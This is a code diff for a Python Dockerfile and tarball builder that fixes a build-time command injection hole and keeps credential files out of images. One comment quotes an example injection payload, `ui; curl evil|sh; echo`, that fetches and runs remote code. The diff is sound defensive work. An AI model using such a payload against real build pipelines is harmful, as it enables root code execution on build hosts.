@@ -11,6 +11,7 @@
 from __future__ import annotations
 
 import logging
+import re
 import shlex
 from dataclasses import dataclass
 from pathlib import Path
@@ -33,6 +34,10 @@ BASE_IMAGE = "ghcr.io/tencentcloud/cubesandbox-base:latest"
 # 各语言工具链的 apt/安装片段 + warmup 命令模板
 _JDK_DEFAULT = "17"
 _NODE_DEFAULT = "20"
+
+# 安全：dep_source 子目录名白名单（S-5）——只允许常规相对路径字符；拒 `..` 逃逸、
+# 拒绝对路径、拒一切 shell 元字符。仓库内容即攻击者可控，故是"允许什么"而非"禁止什么"。
+_SAFE_SUBDIR_RE = re.compile(r"^(?!/)(?!.*\.\.)[A-Za-z0-9._][A-Za-z0-9._/-]*$")
 
 
 def template_exists_in_cubemaster(template_id: str) -> bool | None:
@@ -377,12 +382,22 @@ def generate_dockerfile(spec: EnvSpec, *, src_included: bool = False) -> str:
                 continue
             dep = (tc.dep_source or "package.json").replace("\\", "/").lstrip("/")
             sub = dep.rsplit("/", 1)[0] if "/" in dep else ""  # package.json 所在目录（"" = 项目根）
+            # ★构建期 RCE 治本（26 号文 S-5）★：`dep_source` 来自【被扫描仓库的内容】
+            # （rglob 出来的相对路径），仓库内容即攻击者可控。未转义直接拼进 `RUN` 时，
+            # 形如 `ui; curl evil|sh; echo` 的目录名会以 root 在构建机 dockerd 内执行、
+            # 带完整出网。同文件 :825/:892/:903 三处都已正确 shlex.quote，此处是唯一漏网。
+            # 另加路径形态白名单：`..` 逃逸与绝对路径一律拒（既防 RCE 也防写到 /workspace 外）。
+            if sub and not _SAFE_SUBDIR_RE.match(sub):
+                logger.warning(
+                    "跳过 npm warmup：dep_source 子目录名不安全（可能是注入载荷或路径逃逸）: %r", sub)
+                continue
             wd = "/workspace" + (f"/{sub}" if sub else "")
+            _wd_q = shlex.quote(wd)
             lines.append(f"# warmup：前端 {wd} 联网装依赖，固化 node_modules 进镜像层")
             # npm ci 要求 lock 文件齐全；缺 lock 退化 npm install；都失败不阻断（运行时联网兜底）
             lines.append(
-                f"RUN cd {wd} && (npm ci 2>&1 | tail -5 || npm install 2>&1 | tail -5 || "
-                f"echo '⚠️ {wd} npm 预装失败：运行时联网兜底')"
+                f"RUN cd {_wd_q} && (npm ci 2>&1 | tail -5 || npm install 2>&1 | tail -5 || "
+                f"echo 'npm 预装失败：运行时联网兜底')"
             )
 
     lines.append("# envd 由 base entrypoint 拉起；无前台 CMD。")
@@ -472,10 +487,16 @@ def _make_source_tarball(project_root: str | Path) -> bytes:
                             _skipped_link,
                         )
                 return out_buf.getvalue()
-        except Exception:  # noqa: BLE001 — git archive 失败回退工作区扫描
-            pass
+        except Exception as _ga_exc:  # noqa: BLE001 — git archive 失败回退工作区扫描
+            # 26 号文 J-H：原先 `except: pass` 零日志，既打破 docstring 承诺的
+            # "镜像基线=git HEAD"不变量，又让 _dependency_fingerprint 读 HEAD、tarball 读
+            # 工作区（B3 要根治的错位从后门放回）。回退是合理的，但必须留痕。
+            logger.warning(
+                "源码 tarball：git archive 失败，回退【工作区扫描】——镜像基线不再等于 "
+                "git HEAD（未提交改动会一并入镜像）: %s", _ga_exc)
 
     # 非 git 仓库 / git archive 失败 → 扫工作区当前内容
+    _skipped_sensitive: list[tuple[str, str]] = []
     buf = io.BytesIO()
     with tarfile.open(fileobj=buf, mode="w:gz") as tar:
         for path in project_root.rglob("*"):
@@ -488,6 +509,17 @@ def _make_source_tarball(project_root: str | Path) -> bytes:
             if not path.is_file():
                 continue
             if path.suffix.lower() in _SRC_EXCLUDE_EXTS:
+                continue
+            # ★敏感文件绝不进镜像（26 号文 S-4）★：_SRC_EXCLUDE_* 是纯构建产物清单、
+            # 无任何安全语义，实测 tarball 曾含 .env / .git-credentials / .npmrc /
+            # deploy.pem / id_rsa。而链路是 COPY → chmod -R 0777 → docker push 到
+            # localhost:5000（registry:2 默认无 TLS 无认证）→ **固化为可复用模板**，
+            # 属不可撤销损失。判据复用 knowledge/ingest_guard（已过双复核、含源码扩展名
+            # 排除，绝不误杀 env.py/Credentials.java 这类一等源码），不另造第二套口径。
+            _rel_posix = "/".join(path.relative_to(project_root).parts)
+            _sens = _sensitive_reject_reason(_rel_posix)
+            if _sens:
+                _skipped_sensitive.append((_rel_posix, _sens))
                 continue
             # 跳过超大文件（>5MB，源码不应有，多半是误置的二进制/数据）
             try:
@@ -502,7 +534,27 @@ def _make_source_tarball(project_root: str | Path) -> bytes:
                 continue
             arcname = "/".join(path.relative_to(project_root).parts)
             tar.add(str(path), arcname=arcname)
+    if _skipped_sensitive:
+        # always-emit：安全剔除必须留痕（本仓纪律：降级路径至少一次 WARNING）
+        logger.warning(
+            "源码 tarball 剔除 %d 个敏感文件（绝不入镜像）: %s",
+            len(_skipped_sensitive), [p for p, _ in _skipped_sensitive[:8]])
     return buf.getvalue()
+
+
+def _sensitive_reject_reason(rel_path: str) -> str | None:
+    """敏感文件判据——复用 knowledge/ingest_guard 的单一事实源（S-4 治本）。
+
+    该判据已过 W1 双复核：含源码扩展名排除（`env.py`/`Credentials.java`/`secrets.py`
+    这类一等源码不会被误杀）、隐藏路径、以及 kubeconfig/tfvars/tfstate 等业界头号泄露源。
+    判据不可用时 **fail-closed 拒绝该文件**——凭据进镜像不可撤销，宁可少打一个文件。
+    """
+    try:
+        from swarm.knowledge.ingest_guard import reject_reason_by_name
+        return reject_reason_by_name(rel_path)
+    except Exception as exc:  # noqa: BLE001
+        logger.warning("敏感文件判据不可用 → fail-closed 剔除 %s: %s", rel_path, exc)
+        return "guard_unavailable"
 
 
 def _selftest_command(spec: EnvSpec) -> str | None:
